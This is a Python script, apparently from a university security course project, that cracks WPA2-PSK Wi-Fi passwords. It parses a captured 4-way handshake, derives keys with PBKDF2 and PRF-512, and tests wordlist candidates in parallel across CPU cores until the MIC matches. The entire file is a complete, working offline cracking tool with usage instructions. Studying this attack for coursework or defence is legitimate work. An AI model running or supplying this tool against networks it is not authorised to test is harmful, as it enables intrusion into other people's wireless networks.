#!/usr/bin/env python3
"""
crack_fast.py -- CSE 406 Project (Topic 20)

Parallel offline dictionary attack on a captured WPA2-PSK 4-way handshake.
Crypto: PMK = PBKDF2-HMAC-SHA1(pw, ssid, 4096, 32); PTK = PRF-512; KCK = PTK[:16];
MIC = HMAC-SHA1(KCK, EAPOL-with-MIC-zeroed)[:16]. Match on MIC = right password.

EAPOL is located by walking the raw 802.11 bytes like aircrack-ng (handles
QoS-Data headers and truncates to the real EAPOL length), so it parses the
same frames aircrack does -- not whatever scapy happens to dissect.

Usage:
    sudo python3 crack_fast.py <capture.cap> "<ESSID>" [wordlist]
    sudo python3 crack_fast.py capture-03.cap "Alexander the Great" testlist.txt
"""

import sys, time, hmac, hashlib
from multiprocessing import Pool, cpu_count
from scapy.all import rdpcap, Dot11

CHUNK = 5000


# ---- aircrack-style EAPOL locator (identical to capture.py) ----
def eapol_from_dot11(h):
    if len(h) < 24:
        return None
    fc0, fc1 = h[0], h[1]
    if (fc0 & 0x0C) != 0x08:
        return None
    z = 30 if (fc1 & 0x03) == 0x03 else 24
    if fc0 & 0x80:
        z += 2
    if h[z:z + 6] != b"\xaa\xaa\x03\x00\x00\x00":
        return None
    if h[z + 6:z + 8] != b"\x88\x8e":
        return None
    eapol = h[z + 8:]
    if len(eapol) < 4:
        return None
    size = ((eapol[2] << 8) | eapol[3]) + 4
    if not (0 < size <= len(eapol)):
        return None
    return eapol[:size]


def mac_to_bytes(mac):
    return bytes(int(b, 16) for b in mac.split(":"))


def parse_handshakes(capfile):
    packets = rdpcap(capfile)
    msg1, msg2 = {}, {}
    for pkt in packets:
        if not pkt.haslayer(Dot11):
            continue
        e = eapol_from_dot11(bytes(pkt[Dot11]))
        if e is None:
            continue
        ki = (e[5] << 8) | e[6]
        rc = e[9:17]
        nonce = e[17:49]
        ack, mic_b, secure = ki & 0x0080, ki & 0x0100, ki & 0x0200
        try:
            a1 = mac_to_bytes(pkt.addr1); a2 = mac_to_bytes(pkt.addr2)
        except Exception:
            continue

        if ack and not mic_b:                       # msg1: ANonce, AP->client
            msg1[rc] = (nonce, a2, a1)              # (anonce, ap, client)
        elif mic_b and not ack and not secure:      # msg2: SNonce+MIC, client->AP
            mic   = e[81:97]
            eapol = e[:81] + b"\x00" * 16 + e[97:]  # zero the MIC field
            version = ki & 0x0007
            msg2[rc] = (nonce, mic, eapol, version, a1, a2)  # (.., ap, client)

    tuples = []
    for rc, (sn, mic, eapol, ver, ap, cl) in msg2.items():
        if rc in msg1:
            an, ap1, cl1 = msg1[rc]
            tuples.append(dict(anonce=an, snonce=sn, mic=mic, eapol=eapol,
                               version=ver, ap=ap1, client=cl1))
    if not tuples:
        sys.exit(f"[-] No matched msg1+msg2 pair (saw {len(msg1)} msg1, "
                 f"{len(msg2)} msg2). Recapture a clean single handshake.")
    return tuples


def compute_mic(passphrase, hs, essid):
    pmk = hashlib.pbkdf2_hmac("sha1", passphrase.encode(), essid.encode(), 4096, 32)
    ap, cl = hs["ap"], hs["client"]
    an, sn = hs["anonce"], hs["snonce"]
    data = min(ap, cl) + max(ap, cl) + min(an, sn) + max(an, sn)
    r, i = b"", 0
    while len(r) < 64:
        r += hmac.new(pmk, b"Pairwise key expansion" + b"\x00" + data + bytes([i]),
                      hashlib.sha1).digest()
        i += 1
    kck = r[:16]
    if hs["version"] == 1:
        return hmac.new(kck, hs["eapol"], hashlib.md5).digest()
    return hmac.new(kck, hs["eapol"], hashlib.sha1).digest()[:16]


_HS = _ESSID = None
def _init(hs, essid):
    global _HS, _ESSID; _HS, _ESSID = hs, essid

def _check_chunk(words):
    for w in words:
        w = w.strip()
        if not (8 <= len(w) <= 63):
            continue
        for hs in _HS:
            if compute_mic(w, hs, _ESSID) == hs["mic"]:
                return w
    return None

def wordlist_chunks(path, size):
    buf = []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            buf.append(line)
            if len(buf) >= size:
                yield buf; buf = []
    if buf:
        yield buf


def main():
    if not (3 <= len(sys.argv) <= 4):
        sys.exit(f'usage: sudo python3 {sys.argv[0]} <capture.cap> "<ESSID>" [wordlist]')
    capfile, essid = sys.argv[1], sys.argv[2]
    wordlist = sys.argv[3] if len(sys.argv) == 4 else "./rockyou.txt"

    hs = parse_handshakes(capfile)
    h0 = hs[0]
    print(f"[+] Handshakes paired : {len(hs)}")
    print(f"[+] ESSID (salt)      : {essid!r}")
    print(f"[+] AP  / Client      : {h0['ap'].hex(':')}  /  {h0['client'].hex(':')}")
    print(f"[+] Target MIC        : {h0['mic'].hex()}  (descriptor version {h0['version']})")

    ncores = cpu_count()
    print(f"[*] Cracking with {ncores} cores against '{wordlist}'...\n")
    start, tested, found = time.time(), 0, None
    with Pool(ncores, initializer=_init, initargs=(hs, essid)) as pool:
        for res in pool.imap_unordered(_check_chunk, wordlist_chunks(wordlist, CHUNK)):
            tested += CHUNK
            if res:
                found = res; pool.terminate(); break
            if tested % (CHUNK * 10) == 0:
                print(f"    ~{tested:,} tried ({tested/(time.time()-start):,.0f}/s)")

    el = time.time() - start
    if found:
        print(f"\n[+] KEY FOUND!  ->  {found}")
    else:
        print("\n[-] Not in wordlist. If you KNOW it should match, re-check the "
              "ESSID spelling (it is the PBKDF2 salt).")
    print(f"[*] ~{tested:,} candidates in {el:.1f}s")


if __name__ == "__main__":
    main()
